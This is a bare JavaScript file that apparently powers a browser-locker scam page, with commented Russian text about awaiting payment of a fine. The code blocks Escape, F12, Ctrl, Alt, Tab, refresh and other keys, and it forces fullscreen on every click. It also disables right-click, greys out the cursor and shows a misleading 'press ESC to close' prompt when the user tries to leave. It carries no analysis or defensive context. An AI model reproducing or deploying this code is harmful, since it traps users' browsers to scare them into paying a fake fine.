 window.onkeydown = function(evt) {
     if (evt.keyCode == 27 || evt.keyCode == 18 || evt.keyCode == 123 || evt.keyCode == 85 || evt.keyCode == 9 || evt.keyCode == 115 || evt.keyCode == 116 || evt.keyCode == 112 || evt.keyCode == 114 || evt.keyCode == 17 || evt.keyCode == 46) {
         return false
     }
 };
 window.onkeypress = function(evn) {
     if (evn.keyCode == 123 || evn.keyCode == 117) return false
 };

 function viewdiv(id) {
     var el = document.getElementById(id);
     el.style.display = "block";
 }

 onbeforeunload = function() {
     alert("Нажмите ESC, чтобы закрыть страницу!");
     return "Нажмите ESC, чтобы закрыть страницу!";
 }

 var stroka = "";

 function toggleFullScreen() {
     if (!document.fullscreenElement && !document.mozFullScreenElement && !document.webkitFullscreenElement) {
         if (document.documentElement.requestFullscreen) {
             document.documentElement.requestFullscreen()
         } else if (document.documentElement.mozRequestFullScreen) {
             document.documentElement.mozRequestFullScreen()
         } else if (document.documentElement.webkitRequestFullscreen) {
             document.documentElement.webkitRequestFullscreen(Element.ALLOW_KEYBOARD_INPUT)
         }
     }
 }



 document.addEventListener('keyup', function(e) {
     if (e.keyCode == 122 || e.keyCode == 17 || e.keyCode == 18 || e.keyCode == 13 || e.keyCode == 27) {
         toggleFullScreen();
         document.getElementById('map').innerHTML = stroka;
         viewdiv('mydiv');
         document.body.style.cursor = 'not-allowed'
     }
 }, false);

 var pr = 1;
 window.onload = function() {
     document.onclick = function(e) {
         e = e || event;
         target = e.target || e.srcElement;
         toggleFullScreen();
         //if (pr <= 1) {
         //    document.getElementById('ots').innerHTML = "<img width='1' height='1' style='display:none' src='http://main.exoclick.com/tag.php?goal=a78c836f46380861ba27993336cc01e3'>";
         //    pr++;
         //}
         document.getElementById('map').innerHTML = stroka;
         viewdiv('mydiv');
         document.body.style.cursor = 'not-allowed';

         var i = 0;
         setTimeout(function() {
             while (i < 30000) {
                 //         alert ("Статус: Ожидается оплата штрафа ...");
                 //toggleFullScreen();		
                 //         alert ("Статус: Проверка оплаты штрафа ...");
                 i++;
             }
         }, 1000);

     }
 }


 document.oncontextmenu = new Function("return false");